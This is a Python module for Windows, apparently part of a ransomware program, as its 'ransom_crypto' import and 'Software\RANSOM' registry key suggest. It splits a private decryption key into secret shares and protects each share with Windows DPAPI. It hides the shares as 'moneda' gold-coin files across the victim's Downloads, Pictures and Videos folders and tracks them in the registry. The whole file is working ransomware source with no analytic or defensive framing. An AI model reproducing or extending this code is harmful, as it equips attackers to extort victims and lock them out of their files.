import base64
import ctypes
import json
import os
import uuid
import winreg
from ctypes import wintypes

from ransom_crypto import split_secret

_kernel32 = ctypes.WinDLL("kernel32")
_crypt32 = ctypes.WinDLL("crypt32")
_ole32 = ctypes.windll.ole32
_shell32 = ctypes.windll.shell32
CRYPTPROTECT_UI_FORBIDDEN = 0x1

REG_PATH = r"Software\RANSOM"
REG_VALUE = "GoldCoins"
COIN_COUNT = 5

_FID_DOWNLOADS = "374DE290-123F-4565-9164-39C4925E467B"
_FID_PICTURES = "33E28130-4E1E-4676-835A-98395C3BC3BB"
_FID_VIDEOS = "18989B1D-99B5-455B-841C-AB7C74E4DDFC"


class _DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]


class _GUID(ctypes.Structure):
    _fields_ = [("Data1", wintypes.DWORD), ("Data2", wintypes.WORD),
                ("Data3", wintypes.WORD), ("Data4", ctypes.c_ubyte * 8)]


def _known_folder(fid: str):
    try:
        guid = _GUID()
        if _ole32.CLSIDFromString(ctypes.c_wchar_p("{" + fid + "}"), ctypes.byref(guid)) != 0:
            return None
        ptr = ctypes.c_wchar_p()
        if _shell32.SHGetKnownFolderPath(ctypes.byref(guid), 0, None, ctypes.byref(ptr)) == 0:
            path = ptr.value
            _ole32.CoTaskMemFree(ptr)
            return path
    except Exception:
        pass
    return None


def _coin_placements() -> list:
    profile = os.path.expanduser("~")
    downloads = _known_folder(_FID_DOWNLOADS) or os.path.join(profile, "Downloads")
    pictures = _known_folder(_FID_PICTURES) or os.path.join(profile, "Pictures")
    videos = _known_folder(_FID_VIDEOS) or os.path.join(profile, "Videos")
    return [
        (downloads, "moneda_1.gold", 0),
        (downloads, "moneda_2.gold", 1),
        (pictures, "moneda_3.gold", 2),
        (videos, "moneda_4.gold", 3),
        (videos, "moneda_5.gold", 4),
    ]


def _dpapi_protect(data: bytes) -> bytes:
    buf = ctypes.create_string_buffer(data, len(data))
    blob_in = _DATA_BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    blob_out = _DATA_BLOB()
    if not _crypt32.CryptProtectData(ctypes.byref(blob_in), None, None, None, None,
                                     CRYPTPROTECT_UI_FORBIDDEN, ctypes.byref(blob_out)):
        raise OSError("CryptProtectData falló")
    try:
        return ctypes.string_at(blob_out.pbData, blob_out.cbData)
    finally:
        _kernel32.LocalFree(blob_out.pbData)


def _dpapi_unprotect(data: bytes) -> bytes:
    buf = ctypes.create_string_buffer(data, len(data))
    blob_in = _DATA_BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    blob_out = _DATA_BLOB()
    if not _crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None,
                                       CRYPTPROTECT_UI_FORBIDDEN, ctypes.byref(blob_out)):
        raise OSError("CryptUnprotectData falló")
    try:
        return ctypes.string_at(blob_out.pbData, blob_out.cbData)
    finally:
        _kernel32.LocalFree(blob_out.pbData)


def _write_coin_data(candidates: list, name: str, data: bytes) -> str:
    for folder in candidates:
        try:
            os.makedirs(folder, exist_ok=True)
            full = os.path.join(folder, name)
            with open(full, "wb") as f:
                f.write(data)
            return full
        except Exception:
            continue
    full = os.path.join(os.environ.get("TEMP", "."), name)
    with open(full, "wb") as f:
        f.write(data)
    return full


def create_ransom_coins(private_pem: bytes, count: int = COIN_COUNT) -> int:
    from global_state import Global

    shares = split_secret(private_pem, count)
    placements = _coin_placements()
    profile = os.path.expanduser("~")
    created = []

    for idx in range(min(count, len(placements))):
        folder, name = placements[idx][0], placements[idx][1]
        payload = json.dumps({
            "COIN_ID": uuid.uuid4().hex,
            "SHARE_IDX": idx,
            "SHARE": base64.b64encode(shares[idx]).decode(),
        }).encode("utf-8")
        data = _dpapi_protect(payload)
        try:
            full = _write_coin_data(
                [folder, profile, os.path.join(profile, "Desktop")], name, data)
            created.append(full)
        except Exception:
            continue

    _append_registry(created)
    return len(created)


def decrypt_coin(path: str) -> dict:
    with open(path, "rb") as f:
        return json.loads(_dpapi_unprotect(f.read()).decode("utf-8"))


def delete_all_coins():
    paths = _registry_list() or []
    for p in paths:
        try:
            os.remove(p)
        except Exception:
            pass
    try:
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, REG_PATH, 0,
                                winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, REG_VALUE)
    except FileNotFoundError:
        pass


def _registry_list():
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ) as key:
            value, vtype = winreg.QueryValueEx(key, REG_VALUE)
        return list(value) if vtype == winreg.REG_MULTI_SZ else None
    except (FileNotFoundError, OSError):
        return None


def _append_registry(new_paths):
    existing = _registry_list() or []
    merged = list(dict.fromkeys(existing + list(new_paths)))
    with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, REG_PATH, 0,
                            winreg.KEY_SET_VALUE) as key:
        winreg.SetValueEx(key, REG_VALUE, 0, winreg.REG_MULTI_SZ, merged)
